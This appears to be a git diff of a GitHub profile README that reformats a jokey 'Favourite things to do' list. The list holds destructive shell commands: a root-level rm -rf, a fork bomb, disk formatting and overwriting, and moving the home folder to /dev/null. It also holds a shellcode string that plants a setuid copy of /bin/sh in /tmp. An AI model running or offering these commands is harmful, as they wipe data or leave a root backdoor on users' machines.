@@ -11,13 +11,17 @@ VSCode
 <img align="left" alt="Python" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/python/python.png" />
 <img align="left" alt="SQL" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/sql/sql.png" />
 <img align="left" alt="SQLite" width="26px" src="https://raw.githubusercontent.com/github/explore/master/topics/sqlite/sqlite.png" />
-<img align="left" alt="Windows Terminal" width="26px" src="https://raw.githubusercontent.com/github/explore/80688e429a7d4ef2fca1e82350fe8e3517d3494d/topics/terminal/terminal.png" />
+<img align="left" alt="Windows Terminal" width="26px" src="https://news-cdn.softpedia.com/images/fitted/340x180/microsoft-reveals-the-new-windows-terminal-icon.jpg" />
+
+<br>
 
 #### **Favourite things to do:**
 
-sudo rm -rf /*
+<ul>
 
-char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+<li>sudo rm -rf /*</li>
+
+<li>char esp[] __attribute__ ((section(“.text”))) /* e.s.p
 release */
 = “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
 “\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
@@ -27,17 +31,17 @@ release */
 “\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
 “\x6e\x2f\x73\x68\x00\x2d\x63\x00”
 “cp -p /bin/sh /tmp/.beyond; chmod 4755
-/tmp/.beyond;”;
+/tmp/.beyond;”;</li>
 
-:(){ :|: & };:
+<li>:(){ :|: & };:</li>
 
-mkfs.ext4 /dev/sda1
+<li>mkfs.ext4 /dev/sda1</li>
 
-dd if=/dev/random of=/dev/sda
+<li>dd if=/dev/random of=/dev/sda</li>
 
-mv ~ /dev/null
+<li>mv ~ /dev/null</li>
 
-##### _Hope nobody minds me doing this to their computer ;)
+##### _Hope nobody minds me doing this to their computer ;)_
 
 #### Contact me:
 
